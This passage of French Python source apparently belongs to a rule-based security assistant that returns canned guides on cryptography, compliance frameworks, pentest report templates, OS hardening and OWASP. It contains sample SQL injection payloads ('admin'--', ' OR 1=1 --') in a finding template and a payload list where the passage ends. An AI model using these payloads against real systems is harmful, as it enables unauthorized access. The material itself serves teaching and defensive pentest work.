                "  Argon2id      → ✓ Meilleur pour mots de passe (résistant GPU)\n"
                "  PBKDF2        → ✓ Dérivation de clé (NIST approuvé)\n\n"
                "Hasher en Python :\n"
                "  import hashlib; hashlib.sha256(b'data').hexdigest()\n"
                "  import bcrypt; bcrypt.hashpw(b'pass', bcrypt.gensalt())\n\n"
                "Identifier un hash inconnu :\n"
                "  hash-identifier <hash>   (ou hashid)",
                {"domain": "crypto"})

        # ── Chiffrement symétrique/asymétrique ────────────────────────────────
        if any(kw in t for kw in ["aes", "rsa", "ecc", "chiffrement", "chiffrer", "déchiffrer"]):
            return self._result(True,
                "🔐  Cryptographie — Chiffrement\n\n"
                "SYMÉTRIQUE (même clé) :\n"
                "  AES-256-GCM  → Standard actuel (authentifié)\n"
                "  AES-256-CBC  → Attention au padding oracle\n"
                "  ChaCha20-Poly1305 → Mobile/IoT (résistant timing)\n\n"
                "  Python AES-GCM :\n"
                "    from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
                "    key = os.urandom(32)\n"
                "    nonce = os.urandom(12)\n"
                "    ct = AESGCM(key).encrypt(nonce, b'data', None)\n\n"
                "ASYMÉTRIQUE (clé publique/privée) :\n"
                "  RSA-2048+  → Chiffrement, signatures\n"
                "  ECDSA P-256→ Signatures (plus court que RSA)\n"
                "  Ed25519    → Signatures modernes (SSH, TLS 1.3)\n"
                "  ECDH       → Échange de clé Diffie-Hellman sur courbes\n\n"
                "  Python RSA :\n"
                "    from cryptography.hazmat.primitives.asymmetric import rsa, padding\n"
                "    private = rsa.generate_private_key(65537, 2048)\n"
                "    ct = private.public_key().encrypt(b'data', padding.OAEP(...))\n\n"
                "ATTAQUES CLASSIQUES :\n"
                "  Padding Oracle → AES-CBC sans authentification\n"
                "  RSA e=3        → Small exponent attack\n"
                "  Nonce reuse    → AESGCM — catastrophique\n"
                "  Timing attack  → implémentation non-constant-time",
                {"domain": "crypto"})

        # ── GPG ───────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["gpg", "pgp"]):
            return self._result(True,
                "🔐  GPG — Chiffrement et signatures\n\n"
                "Générer une clé :\n"
                "  gpg --full-generate-key\n\n"
                "Chiffrer un fichier :\n"
                "  gpg --encrypt --recipient email@example.com fichier.txt\n"
                "  gpg --symmetric --cipher-algo AES256 fichier.txt   (avec mot de passe)\n\n"
                "Déchiffrer :\n"
                "  gpg --decrypt fichier.txt.gpg\n\n"
                "Signer :\n"
                "  gpg --sign fichier.txt           (signature binaire)\n"
                "  gpg --clearsign fichier.txt       (signature texte)\n"
                "  gpg --detach-sign fichier.txt     (signature séparée)\n\n"
                "Vérifier signature :\n"
                "  gpg --verify fichier.txt.sig fichier.txt\n\n"
                "Exporter clé publique :\n"
                "  gpg --armor --export email@example.com",
                {"domain": "crypto", "tool": "gpg"})

        # ── Attaques crypto CTF ────────────────────────────────────────────────
        if any(kw in t for kw in ["xor cipher", "vigenere", "caesar", "rot13", "base64", "encode", "decode"]):
            return self._result(True,
                "🔐  Crypto CTF — Techniques classiques\n\n"
                "Base64 :\n"
                "  echo 'data' | base64\n"
                "  echo 'ZGF0YQ==' | base64 -d\n"
                "  python3: import base64; base64.b64decode(s)\n\n"
                "ROT13 / César :\n"
                "  echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'    (rot13)\n"
                "  python3: codecs.decode('text', 'rot_13')\n\n"
                "XOR :\n"
                "  python3: bytes([a ^ b for a, b in zip(ct, key * (len(ct)//len(key)+1))])\n"
                "  xortool <fichier>    (analyse XOR automatique)\n\n"
                "Vigenère :\n"
                "  dcode.fr/chiffre-vigenere   (décryptage en ligne)\n"
                "  python3 : kasiski_test() pour trouver la longueur de clé\n\n"
                "Identifier le chiffrement :\n"
                "  dcode.fr/identification-chiffrement\n"
                "  cyberchef.io    (Swiss-army knife)\n\n"
                "Outils CTF :\n"
                "  pwntools (python) — crypto CTF\n"
                "  SageMath          — mathématiques crypto\n"
                "  RsaCtfTool        — attaques RSA automatiques",
                {"domain": "crypto", "ctf": True})

        return self._result(True,
            "🔐  Cryptographie — Vue d'ensemble\n\n"
            "  openssl <host>     → analyser TLS d'un serveur\n"
            "  openssl générer    → créer clés/certificats\n"
            "  hash sha256        → fonctions de hachage et recommandations\n"
            "  aes / rsa / ecc   → chiffrement symétrique/asymétrique\n"
            "  gpg                → chiffrement et signatures PGP\n"
            "  xor / base64       → techniques CTF\n"
            "  <hash_hex>        → identifier et craquer un hash\n\n"
            "Précise le contexte pour un guide détaillé.",
            {"domain": "crypto"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 14 — GOUVERNANCE & CONFORMITÉ (ISO 27001, NIST, CVSS)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_governance(self, task: str) -> dict:
        t = task.lower()

        if any(kw in t for kw in ["iso 27001", "iso27001", "27001"]):
            return self._result(True,
                "📋  ISO 27001 — Système de Management de la Sécurité (SMSI)\n\n"
                "STRUCTURE DE LA NORME :\n"
                "  Annexe A — 93 contrôles en 4 thèmes :\n"
                "    A.5  Organisationnels (37 contrôles)\n"
                "    A.6  Humains (8 contrôles)\n"
                "    A.7  Physiques (14 contrôles)\n"
                "    A.8  Technologiques (34 contrôles)\n\n"
                "ÉTAPES DE CERTIFICATION :\n"
                "  1. Définir le périmètre (scope)\n"
                "  2. Évaluation des risques (ISO 27005)\n"
                "  3. Déclaration d'applicabilité (SoA)\n"
                "  4. Plan de traitement des risques\n"
                "  5. Mise en œuvre des contrôles\n"
                "  6. Audit interne\n"
                "  7. Revue de direction\n"
                "  8. Audit de certification (stage 1 + stage 2)\n\n"
                "CONTRÔLES CRITIQUES :\n"
                "  A.8.8  — Gestion des vulnérabilités\n"
                "  A.8.20 — Sécurité réseau\n"
                "  A.8.24 — Utilisation de la cryptographie\n"
                "  A.5.7  — Threat Intelligence\n"
                "  A.5.24 — Gestion des incidents",
                {"domain": "governance", "standard": "iso27001"})

        if any(kw in t for kw in ["nist", "nist csf", "cybersecurity framework"]):
            return self._result(True,
                "📋  NIST Cybersecurity Framework (CSF 2.0)\n\n"
                "6 FONCTIONS CORE :\n"
                "  GOVERN (GV)  → Gouvernance, politique, rôles\n"
                "  IDENTIFY (ID)→ Actifs, risques, lacunes\n"
                "  PROTECT (PR) → Contrôles d'accès, formation, maintenance\n"
                "  DETECT (DE)  → Monitoring, détection d'anomalies\n"
                "  RESPOND (RS) → Réponse aux incidents, communication\n"
                "  RECOVER (RC) → Reprise, améliorations post-incident\n\n"
                "TIERS DE MATURITÉ :\n"
                "  Tier 1 — Partiel (ad hoc)\n"
                "  Tier 2 — Informé (risque conscient)\n"
                "  Tier 3 — Répétable (processus formels)\n"
                "  Tier 4 — Adaptatif (amélioration continue)\n\n"
                "AUTRES FRAMEWORKS NIST :\n"
                "  NIST SP 800-53  → Contrôles fédéraux US\n"
                "  NIST SP 800-115 → Guide pentest technique\n"
                "  NIST SP 800-61  → Réponse aux incidents\n"
                "  NIST SP 800-171 → Protection CUI",
                {"domain": "governance", "standard": "nist"})

        if any(kw in t for kw in ["cvss", "score", "scoring", "cvss score"]):
            return self._result(True,
                "📊  CVSS v3.1 — Common Vulnerability Scoring System\n\n"
                "VECTEURS DE BASE :\n"
                "  AV (Attack Vector)   : N(réseau) / A(adjacent) / L(local) / P(physique)\n"
                "  AC (Attack Complexity): L(faible) / H(élevée)\n"
                "  PR (Privileges Req.) : N(aucun) / L(faible) / H(élevé)\n"
                "  UI (User Interaction): N(aucun) / R(requis)\n"
                "  S  (Scope)           : U(inchangé) / C(changé)\n"
                "  C  (Confidentiality) : N / L / H\n"
                "  I  (Integrity)       : N / L / H\n"
                "  A  (Availability)    : N / L / H\n\n"
                "NIVEAUX DE SÉVÉRITÉ :\n"
                "  0.0       → None\n"
                "  0.1–3.9   → Low\n"
                "  4.0–6.9   → Medium\n"
                "  7.0–8.9   → High\n"
                "  9.0–10.0  → Critical\n\n"
                "CALCULER UN SCORE :\n"
                "  nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n"
                "  python3: cvss (pip install cvss)\n"
                "    from cvss import CVSS3\n"
                "    c = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')\n"
                "    print(c.scores())  → (10.0, ...)\n\n"
                "EXEMPLE VECTEUR CRITIQUE :\n"
                "  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)",
                {"domain": "governance", "tool": "cvss"})

        if any(kw in t for kw in ["pci dss", "pcidss", "pci-dss"]):
            return self._result(True,
                "📋  PCI DSS v4.0 — Payment Card Industry\n\n"
                "12 EXIGENCES PRINCIPALES :\n"
                "  1. Pare-feu réseau configuré\n"
                "  2. Pas de mots de passe par défaut\n"
                "  3. Protéger les données de titulaires de carte\n"
                "  4. Chiffrement en transit (TLS 1.2+)\n"
                "  5. Antimalware sur tous les systèmes\n"
                "  6. Sécuriser les systèmes et applications (patching, WAF)\n"
                "  7. Contrôle d'accès need-to-know\n"
                "  8. Identification unique par utilisateur + MFA\n"
                "  9. Sécurité physique\n"
                " 10. Journalisation et surveillance\n"
                " 11. Tests de sécurité réguliers (pentest annuel, ASV)\n"
                " 12. Politique de sécurité documentée\n\n"
                "SCOPES D'ÉVALUATION :\n"
                "  SAQ A      → Marchand redirigé (e-commerce simple)\n"
                "  SAQ D      → Tous les contrôles requis\n"
                "  QSA        → Qualified Security Assessor (sur site)\n\n"
                "POINTS CRITIQUES PENTEST PCI :\n"
                "  Segmentation réseau CDE isolé\n"
                "  Rotation des clés de chiffrement\n"
                "  WAF devant les applis",
                {"domain": "governance", "standard": "pci_dss"})

        if any(kw in t for kw in ["rgpd", "gdpr"]):
            return self._result(True,
                "📋  RGPD / GDPR — Protection des données personnelles\n\n"
                "PRINCIPES FONDAMENTAUX :\n"
                "  Licéité, loyauté, transparence\n"
                "  Limitation des finalités\n"
                "  Minimisation des données\n"
                "  Exactitude\n"
                "  Limitation de la conservation\n"
                "  Intégrité et confidentialité\n\n"
                "OBLIGATIONS TECHNIQUES (Article 25 & 32) :\n"
                "  Pseudonymisation / chiffrement des données\n"
                "  Confidentialité, intégrité, disponibilité\n"
                "  Résilience des systèmes\n"
                "  Tests de sécurité réguliers\n"
                "  Notification violation sous 72h (Article 33)\n\n"
                "IMPACT PENTEST :\n"
                "  Vérifier : chiffrement BDD, logs d'accès, gestion droits\n"
                "  Tester : injection SQL sur données perso, IDOR sur profils\n"
                "  Rapport : noter les données exposées + sévérité RGPD\n\n"
                "SANCTIONS : jusqu'à 4% CA mondial ou 20M€",
                {"domain": "governance", "standard": "rgpd"})

        if any(kw in t for kw in ["cis benchmark", "cis controls"]):
            return self._result(True,
                "📋  CIS Controls v8 — 18 contrôles essentiels\n\n"
                "IMPLEMENTATION GROUP 1 (bases) :\n"
                "  1. Inventaire des actifs matériels\n"
                "  2. Inventaire des logiciels\n"
                "  3. Protection des données\n"
                "  4. Configuration sécurisée\n"
                "  5. Gestion des comptes\n"
                "  6. Gestion des accès\n\n"
                "CONTRÔLES AVANCÉS :\n"
                "  7.  Gestion des vulnérabilités\n"
                "  8.  Gestion des logs d'audit\n"
                "  9.  Protection email/navigateur\n"
                " 10.  Défense contre malware\n"
                " 11.  Récupération des données\n"
                " 13.  Sécurité réseau\n"
                " 16.  Sécurité applicative\n"
                " 17.  Gestion des incidents\n"
                " 18.  Tests de pénétration\n\n"
                "BENCHMARKS SYSTÈME :\n"
                "  cis-cat-lite      → scanner automatique\n"
                "  ansible/openscap  → durcissement automatisé\n"
                "  inspec (chef)     → compliance as code",
                {"domain": "governance", "standard": "cis"})

        return self._result(True,
            "📋  Gouvernance & Conformité — Référentiels supportés\n\n"
            "  iso 27001     → SMSI, certifification, contrôles Annexe A\n"
            "  nist          → CSF 2.0, SP 800-53, SP 800-115\n"
            "  cvss          → calcul et interprétation scores\n"
            "  pci dss       → sécurité paiement carte\n"
            "  rgpd / gdpr   → protection données personnelles\n"
            "  cis benchmark → durcissement systèmes\n\n"
            "Précise le référentiel pour un guide détaillé.",
            {"domain": "governance"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 15 — RÉDACTION RAPPORT PENTEST
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_report(self, task: str) -> dict:
        t = task.lower()

        if any(kw in t for kw in ["executive summary", "résumé exécutif"]):
            return self._result(True,
                "📝  Executive Summary — Template pentest\n\n"
                "STRUCTURE :\n"
                "┌─────────────────────────────────────────────┐\n"
                "│  RÉSUMÉ EXÉCUTIF                             │\n"
                "│                                              │\n"
                "│  Contexte :                                  │\n"
                "│    Périmètre testé, dates, équipe            │\n"
                "│                                              │\n"
                "│  Résultat global :                           │\n"
                "│    Niveau de risque : CRITIQUE / ÉLEVÉ / ... │\n"
                "│    X critiques, Y élevées, Z moyennes        │\n"
                "│                                              │\n"
                "│  Points forts :                              │\n"
                "│    [Ce qui fonctionne bien]                  │\n"
                "│                                              │\n"
                "│  Points faibles majeurs :                    │\n"
                "│    [Top 3 vulnérabilités + impact business]  │\n"
                "│                                              │\n"
                "│  Recommandations prioritaires :              │\n"
                "│    1. Immédiat (< 7j) — Patcher CVE-XXXX    │\n"
                "│    2. Court terme (< 30j) — MFA sur VPN     │\n"
                "│    3. Moyen terme (< 90j) — Segmentation     │\n"
                "└─────────────────────────────────────────────┘\n\n"
                "RÈGLES D'OR :\n"
                "  • Pas de jargon technique\n"
                "  • Impact business en premier\n"
                "  • 1 page maximum\n"
                "  • Lié au risque métier, pas technique",
                {"domain": "report", "section": "executive_summary"})

        if any(kw in t for kw in ["findings", "vulnérabilité", "fiche vulnérabilité"]):
            return self._result(True,
                "📝  Template Fiche Vulnérabilité\n\n"
                "┌─────────────────────────────────────────────┐\n"
                "│  VULNÉRABILITÉ #001                          │\n"
                "├─────────────────────────────────────────────┤\n"
                "│  Titre       : SQL Injection — Login         │\n"
                "│  Sévérité    : CRITIQUE (CVSS 9.8)           │\n"
                "│  Composant   : https://app.cible.fr/login    │\n"
                "│  CWE         : CWE-89 (SQL Injection)        │\n"
                "│  CVE         : N/A (custom)                  │\n"
                "├─────────────────────────────────────────────┤\n"
                "│  DESCRIPTION                                 │\n"
                "│    Le paramètre 'username' est vulnérable    │\n"
                "│    à une injection SQL booléenne.            │\n"
                "├─────────────────────────────────────────────┤\n"
                "│  PREUVE (Proof of Concept)                   │\n"
                "│    Requête : POST /login                     │\n"
                "│    Payload : username=admin'--               │\n"
                "│    Résultat : authentification contournée    │\n"
                "│    [CAPTURE D'ÉCRAN]                         │\n"
                "├─────────────────────────────────────────────┤\n"
                "│  IMPACT                                      │\n"
                "│    Confidentialité : HAUTE (dump BDD)        │\n"
                "│    Intégrité       : HAUTE (modification)    │\n"
                "│    Disponibilité   : MOYENNE                 │\n"
                "├─────────────────────────────────────────────┤\n"
                "│  REMÉDIATION                                 │\n"
                "│    Court terme : Requêtes préparées (PDO)    │\n"
                "│    Moyen terme : WAF, input validation       │\n"
                "│    Références  : OWASP Top 10 A03:2021       │\n"
                "└─────────────────────────────────────────────┘",
                {"domain": "report", "section": "finding"})

        if any(kw in t for kw in ["template rapport", "structure rapport", "plan rapport"]):
            return self._result(True,
                "📝  Structure complète Rapport de Pentest\n\n"
                "1. PAGE DE GARDE\n"
                "   Client, date, version, classification (CONFIDENTIEL)\n\n"
                "2. SOMMAIRE\n\n"
                "3. RÉSUMÉ EXÉCUTIF (pour le management)\n"
                "   Contexte, risque global, top 3 findings, quick wins\n\n"
                "4. PÉRIMÈTRE ET MÉTHODOLOGIE\n"
                "   Scope, durée, équipe, outils, règles d'engagement\n"
                "   Référentiel : PTES / OWASP / NIST SP 800-115\n\n"
                "5. RÉSULTATS — TABLEAU DE SYNTHÈSE\n"
                "   ID | Titre | Sévérité | Composant | CVSS | Statut\n\n"
                "6. DÉTAIL DES VULNÉRABILITÉS\n"
                "   Pour chaque finding : description, PoC, impact, remédiation\n\n"
                "7. RECOMMANDATIONS PAR PRIORITÉ\n"
                "   Immédiat / Court terme / Moyen terme / Long terme\n\n"
                "8. ANNEXES\n"
                "   Logs bruts, captures d'écran, scripts utilisés\n\n"
                "CLASSIFICATION DES SÉVÉRITÉS :\n"
                "  🔴 Critique (CVSS 9.0+) — Impact immédiat sur le SI\n"
                "  🟠 Élevée   (CVSS 7.0+) — Compromission probable\n"
                "  🟡 Moyenne  (CVSS 4.0+) — Risque conditionnel\n"
                "  🔵 Faible   (CVSS <4.0) — Risque limité\n"
                "  ⚪ Info     (CVSS 0.0)  — Observation",
                {"domain": "report", "section": "full_structure"})

        if any(kw in t for kw in ["remédiation", "recommandation", "plan de remédiation"]):
            return self._result(True,
                "📝  Plan de remédiation — Template\n\n"
                "PRIORISATION PAR RISQUE :\n"
                "┌──────────────┬──────────────────┬──────────┐\n"
                "│ Priorité     │ Délai            │ CVSS     │\n"
                "├──────────────┼──────────────────┼──────────┤\n"
                "│ P0 Immédiat  │ < 48h            │ 9.0–10.0 │\n"
                "│ P1 Urgent    │ < 7 jours        │ 7.0–8.9  │\n"
                "│ P2 Élevé     │ < 30 jours       │ 4.0–6.9  │\n"
                "│ P3 Moyen     │ < 90 jours       │ 0.1–3.9  │\n"
                "└──────────────┴──────────────────┴──────────┘\n\n"
                "STRUCTURE RECOMMANDATION :\n"
                "  Problème    : [Description technique concise]\n"
                "  Solution    : [Action concrète à effectuer]\n"
                "  Vérification: [Comment tester la correction]\n"
                "  Effort      : Faible / Moyen / Élevé\n"
                "  Référence   : OWASP / CWE / CVE / CIS\n\n"
                "QUICK WINS COMMUNS :\n"
                "  • Activer MFA partout (< 1 jour)\n"
                "  • Patcher OS et services exposés (< 3 jours)\n"
                "  • Désactiver protocoles obsolètes (TLS 1.0/1.1, SSLv3)\n"
                "  • Activer en-têtes sécurité HTTP (CSP, HSTS, X-Frame)\n"
                "  • Rotation des secrets et clés API exposés",
                {"domain": "report", "section": "remediation"})

        return self._result(True,
            "📝  Rédaction Rapport Pentest — Guide complet\n\n"
            "  executive summary  → résumé pour le management\n"
            "  findings           → template fiche vulnérabilité\n"
            "  template rapport   → structure complète du rapport\n"
            "  remédiation        → plan de remédiation par priorité\n\n"
            "CONSEILS :\n"
            "  • Audience : distinguer management vs technique\n"
            "  • PoC : toujours inclure une preuve reproducible\n"
            "  • CVSS : scorer chaque vulnérabilité avec vecteur complet\n"
            "  • Remédiation : concrète, testable, priorisée\n"
            "  • Classification : CONFIDENTIEL — données sensibles",
            {"domain": "report"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 1 — ADMINISTRATION OS (Linux / Windows / macOS)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_os_admin(self, task: str) -> dict:
        t = task.lower()

        # ── Linux ─────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["linux", "ubuntu", "debian", "centos", "rhel", "kali"]):

            if any(kw in t for kw in ["hardening", "durcissement"]):
                return self._result(True,
                    "🐧  Linux Hardening — Checklist CIS\n\n"
                    "COMPTES ET ACCÈS :\n"
                    "  passwd -l root                          → désactiver login root\n"
                    "  usermod -s /usr/sbin/nologin <user>     → désactiver shell\n"
                    "  chage -M 90 <user>                      → expiration mdp 90j\n"
                    "  grep '^+' /etc/passwd /etc/shadow       → comptes NIS dangereux\n\n"
                    "SSH :\n"
                    "  /etc/ssh/sshd_config :\n"
                    "    PermitRootLogin no\n"
                    "    PasswordAuthentication no\n"
                    "    Protocol 2\n"
                    "    MaxAuthTries 3\n"
                    "    AllowUsers user1 user2\n\n"
                    "SERVICES :\n"
                    "  systemctl --type=service --state=running  → services actifs\n"
                    "  systemctl disable <service>               → désactiver inutile\n"
                    "  ss -tlnp                                  → ports ouverts\n\n"
                    "PERMISSIONS :\n"
                    "  find / -perm -4000 -type f 2>/dev/null   → SUID dangereux\n"
                    "  find / -perm -2000 -type f 2>/dev/null   → SGID\n"
                    "  find / -nouser -nogroup 2>/dev/null      → fichiers orphelins\n\n"
                    "FIREWALL :\n"
                    "  ufw enable && ufw default deny\n"
                    "  ufw allow ssh\n"
                    "  iptables -L -n -v\n\n"
                    "AUDIT :\n"
                    "  auditd, aide, lynis, OpenSCAP",
                    {"domain": "os_admin", "os": "linux"})

            if any(kw in t for kw in ["logs", "journalisation", "syslog", "journald"]):
                return self._result(True,
                    "🐧  Linux — Journalisation et logs\n\n"
                    "JOURNAUX IMPORTANTS :\n"
                    "  /var/log/auth.log        → authentifications (Debian)\n"
                    "  /var/log/secure          → authentifications (RHEL)\n"
                    "  /var/log/syslog          → messages système\n"
                    "  /var/log/kern.log        → messages kernel\n"
                    "  /var/log/apache2/        → logs Apache\n"
                    "  /var/log/nginx/          → logs Nginx\n"
                    "  journalctl -u ssh        → logs service SSH\n\n"
                    "COMMANDES UTILES :\n"
                    "  journalctl -f                → flux temps réel\n"
                    "  journalctl --since '1h ago'  → 1 dernière heure\n"
                    "  journalctl -p err            → erreurs seulement\n"
                    "  last                         → historique logins\n"
                    "  lastb                        → tentatives échouées\n"
                    "  who / w                      → sessions actives\n"
                    "  ausearch -m USER_LOGIN        → audit logins\n\n"
                    "RECHERCHER COMPROMISSION :\n"
                    "  grep 'Failed password' /var/log/auth.log | head -20\n"
                    "  grep 'Accepted password' /var/log/auth.log\n"
                    "  find /tmp /dev/shm -name '*.sh' -o -name '*.py' 2>/dev/null\n"
                    "  ps auxf | grep -v ']'   → processus suspects",
                    {"domain": "os_admin", "skill": "logging"})

            if any(kw in t for kw in ["processus", "gestion processus", "ps", "service"]):
                return self._result(True,
                    "🐧  Linux — Gestion des processus et services\n\n"
                    "PROCESSUS :\n"
                    "  ps aux                    → tous les processus\n"
                    "  ps auxf                   → arbre de processus\n"
                    "  top / htop                → monitoring temps réel\n"
                    "  kill -9 <PID>             → tuer un processus\n"
                    "  nice -n 10 cmd            → priorité basse\n"
                    "  strace -p <PID>           → syscalls d'un process\n\n"
                    "SERVICES SYSTEMD :\n"
                    "  systemctl status <svc>   → état du service\n"
                    "  systemctl start/stop/restart <svc>\n"
                    "  systemctl enable/disable <svc>  → démarrage auto\n"
                    "  systemctl list-units --type=service\n"
                    "  journalctl -u <svc> -f   → logs temps réel\n\n"
                    "CRON :\n"
                    "  crontab -l              → tâches utilisateur\n"
                    "  cat /etc/crontab        → tâches système\n"
                    "  ls /etc/cron.d/         → crons installés\n"
                    "  ls -la /etc/cron.{daily,weekly,monthly}/\n\n"
                    "SÉCURITÉ :\n"
                    "  pspy64                  → monitor processus sans root",
                    {"domain": "os_admin", "skill": "processes"})

            return self._result(True,
                "🐧  Linux — Administration et sécurité\n\n"
                "  linux hardening   → durcissement CIS checklist\n"
                "  linux logs        → journalisation et recherche compromission\n"
                "  linux processus   → gestion ps/systemd/cron\n"
                "  linux permissions → SUID/SGID/ACL/selinux\n"
                "  linux audit       → auditd, lynis, aide\n\n"
                "Précise le domaine pour un guide détaillé.",
                {"domain": "os_admin", "os": "linux"})

        # ── Windows ───────────────────────────────────────────────────────────
        if any(kw in t for kw in ["windows", "win", "powershell", "cmd", "gpo", "registry", "registre",
                                   "bitlocker", "defender", "event viewer", "wmic"]):
            if any(kw in t for kw in ["hardening", "durcissement"]):
                return self._result(True,
                    "🪟  Windows Hardening — Checklist CIS\n\n"
                    "COMPTES :\n"
                    "  Renommer Administrator → autre nom\n"
                    "  Désactiver Guest account\n"
                    "  Politique MDP : 12+ chars, complexité, 90j\n"
                    "  Account lockout : 5 tentatives → 30min\n\n"
                    "SERVICES :\n"
                    "  Get-Service | Where Status -eq Running      (PowerShell)\n"
                    "  Désactiver : Telnet, SMBv1, LLMNR, NetBIOS\n"
                    "  Set-SmbServerConfiguration -EnableSMB1Protocol $false\n\n"
                    "FIREWALL :\n"
                    "  netsh advfirewall set allprofiles state on\n"
                    "  Set-NetFirewallProfile -Profile * -Enabled True\n\n"
                    "UPDATES :\n"
                    "  wuauclt /detectnow         → forcer vérification\n"
                    "  Get-WindowsUpdateLog       → logs mises à jour\n\n"
                    "AUDIT AVANCÉ :\n"
                    "  auditpol /set /category:*  → activer audit\n"
                    "  Microsoft Baseline Security Analyzer (MBSA)\n"
                    "  CIS-CAT Pro",
                    {"domain": "os_admin", "os": "windows"})

            if any(kw in t for kw in ["logs", "event viewer", "event log"]):
                return self._result(True,
                    "🪟  Windows — Journaux d'événements\n\n"
                    "JOURNAUX PRINCIPAUX :\n"
                    "  Security    → logins, audit, accès\n"
                    "  System      → OS, drivers, services\n"
                    "  Application → apps, erreurs\n\n"
                    "EVENT IDs CRITIQUES :\n"
                    "  4624 → Connexion réussie\n"
                    "  4625 → Connexion échouée\n"
                    "  4648 → Connexion explicite (runas)\n"
                    "  4672 → Droits admin attribués\n"
                    "  4698 → Tâche planifiée créée\n"
                    "  4720 → Compte créé\n"
                    "  7045 → Service installé\n"
                    "  1102 → Journal effacé (!!)\n\n"
                    "POWERSHELL :\n"
                    "  Get-WinEvent -LogName Security -MaxEvents 100\n"
                    "  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select -First 20\n\n"
                    "OUTIL : Chainsaw, Hayabusa, Sigma rules",
                    {"domain": "os_admin", "os": "windows"})

            return self._result(True,
                "🪟  Windows — Administration et sécurité\n\n"
                "  windows hardening  → durcissement CIS\n"
                "  windows logs       → Event IDs critiques\n"
                "  gpo                → Group Policy sécurité\n"
                "  powershell audit   → scripts d'audit\n\n"
                "COMMANDES UTILES :\n"
                "  net user                    → utilisateurs locaux\n"
                "  net localgroup Administrators\n"
                "  whoami /priv                → privilèges courants\n"
                "  systeminfo                  → infos système\n"
                "  netstat -an                 → connexions réseau\n"
                "  tasklist /svc               → processus + services\n"
                "  schtasks /query /fo LIST    → tâches planifiées",
                {"domain": "os_admin", "os": "windows"})

        # ── macOS ─────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["macos", "mac os", "osx", "gatekeeper", "xprotect"]):
            return self._result(True,
                "🍎  macOS — Sécurité et administration\n\n"
                "SÉCURITÉ NATIVE :\n"
                "  Gatekeeper    → vérifie signature des apps\n"
                "  XProtect      → antimalware intégré\n"
                "  TCC           → permissions (cam, micro, disque)\n"
                "  SIP           → System Integrity Protection\n"
                "  FileVault     → chiffrement disque (AES-256)\n"
                "  Secure Enclave→ clés biométriques\n\n"
                "COMMANDES ADMIN :\n"
                "  softwareupdate --list              → mises à jour\n"
                "  spctl --status                     → état Gatekeeper\n"
                "  csrutil status                     → état SIP\n"
                "  system_profiler SPSoftwareDataType → infos système\n"
                "  log stream --predicate 'process == \"sshd\"'\n"
                "  launchctl list | grep -v apple     → LaunchAgents suspects\n\n"
                "FORENSICS macOS :\n"
                "  /Library/Logs/DiagnosticReports/   → crashlogs\n"
                "  ~/Library/Preferences/             → préférences apps\n"
                "  /var/log/                          → logs système\n"
                "  ls -la ~/Library/LaunchAgents/     → persistance\n\n"
                "OUTILS PENTEST macOS :\n"
                "  LockSmith, ESET, Objective-See (RansomWhere, BlockBlock, KnockKnock)",
                {"domain": "os_admin", "os": "macos"})

        # Guide général OS
        return self._result(True,
            "💻  Administration OS — Domaines couverts\n\n"
            "  linux [hardening|logs|processus]   → Linux\n"
            "  windows [hardening|logs|gpo]       → Windows\n"
            "  macos                              → macOS\n\n"
            "POINTS COMMUNS TOUS OS :\n"
            "  Principe du moindre privilège\n"
            "  Désactiver les services inutiles\n"
            "  Journalisation centralisée (SIEM)\n"
            "  Patch management régulier\n"
            "  MFA sur tous les accès admin\n"
            "  Backup isolé et testé (3-2-1)",
            {"domain": "os_admin"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 9 — DÉVELOPPEMENT SÉCURISÉ (OWASP, SAST, API)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_dev_secure(self, task: str) -> dict:
        t = task.lower()

        if any(kw in t for kw in ["owasp top 10", "owasp"]):
            return self._result(True,
                "🛡️  OWASP Top 10 — 2021\n\n"
                "A01 Broken Access Control\n"
                "  Bypass d'autorisation, IDOR, CSRF\n"
                "  Fix : vérification côté serveur, deny-by-default\n\n"
                "A02 Cryptographic Failures\n"
                "  Données sensibles en clair, MD5/SHA1, HTTP\n"
                "  Fix : TLS 1.2+, AES-256, bcrypt\n\n"
                "A03 Injection\n"
                "  SQL, LDAP, OS, NoSQL, XPath injection\n"
                "  Fix : requêtes préparées, ORM, validation input\n\n"
                "A04 Insecure Design\n"
                "  Absence de contrôles de sécurité dès la conception\n"
                "  Fix : Threat Modeling, Secure SDLC\n\n"
                "A05 Security Misconfiguration\n"
                "  Config par défaut, debug activé, S3 public\n"
                "  Fix : hardening, désactiver features inutiles\n\n"
                "A06 Vulnerable Components\n"
                "  Librairies obsolètes, CVE non patchées\n"
                "  Fix : SCA (Snyk, OWASP Dependency-Check)\n\n"
                "A07 Auth Failures\n"
                "  Session fixation, credential stuffing\n"
                "  Fix : MFA, rate limiting, session management\n\n"
                "A08 Software Integrity Failures\n"
                "  Supply chain, CI/CD non sécurisé\n"
                "  Fix : signatures code, SBOM, trusted sources\n\n"
                "A09 Logging Failures\n"
                "  Absence de logs, pas d'alertes\n"
                "  Fix : SIEM, alertes temps réel\n\n"
                "A10 SSRF\n"
                "  Requête serveur vers ressource interne\n"
                "  Fix : allowlist URLs, désactiver redirections",
                {"domain": "dev_secure", "standard": "owasp_top10"})

        if any(kw in t for kw in ["injection sql", "sqli", "sql injection"]):
            return self._result(True,
                "🛡️  Injection SQL — Détection et remédiation\n\n"
                "TYPES :\n"
                "  In-band    : résultat direct dans la réponse\n"
                "  Blind bool : vrai/faux selon la réponse\n"
                "  Blind time : SLEEP()/WAITFOR DELAY pour inférer\n"
                "  Out-of-band: via DNS/HTTP vers serveur attaquant\n\n"
                "PAYLOADS BASIQUES :\n"
                "  ' OR 1=1 --\n"
